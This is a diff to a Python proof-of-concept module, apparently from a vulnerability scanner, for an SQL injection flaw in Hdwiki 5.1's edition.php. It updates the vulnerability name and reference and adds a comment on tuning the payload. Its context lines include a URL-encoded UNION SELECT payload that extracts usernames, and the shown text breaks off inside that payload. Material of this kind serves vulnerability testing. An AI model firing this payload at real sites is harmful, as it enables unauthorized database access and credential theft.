@@ -9,14 +9,14 @@ import urlparse
 
 class Vuln(ABVuln):
     vuln_id = 'Hdwiki_0001' # 平台漏洞编号，留空
-    name = 'Hdwiki 5.1 /control/edition.php SQL注入漏洞'  # 漏洞名称
+    name = 'Hdwiki 5.1 /control/edition.php SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2015-02-25'  # 漏洞公布时间
     desc = '''
         Hdwiki 5.1版本 /control/edition.php参数过滤不严谨导致的SQL注入漏洞。
     '''  # 漏洞描述
-    ref = 'Unkonwn'  # 漏洞来源
+    ref = 'http://0day5.com/archives/2978/'  # 漏洞来源
     cnvd_id = 'Unkonwn'  # cnvd漏洞编号
     cve_id = 'Unkonwn'  # cve编号
     product = 'Hdwiki'  # 漏洞应用名称
@@ -35,6 +35,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             
+            #payload其中的数值需要根据实际情况调整，否则会显示参数错误，具体怎么调整看代码，默认安装是这个POC
             verify_url = '%s/index.php?edition-compare-1' % self.target
             payload = ("eid[0]=2&eid[1]=19&eid[2]=-1%29%20UNION%20SELECT%201%2C2%2C35"
                        "%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cmd5%28233%29%2Cusername%2C"
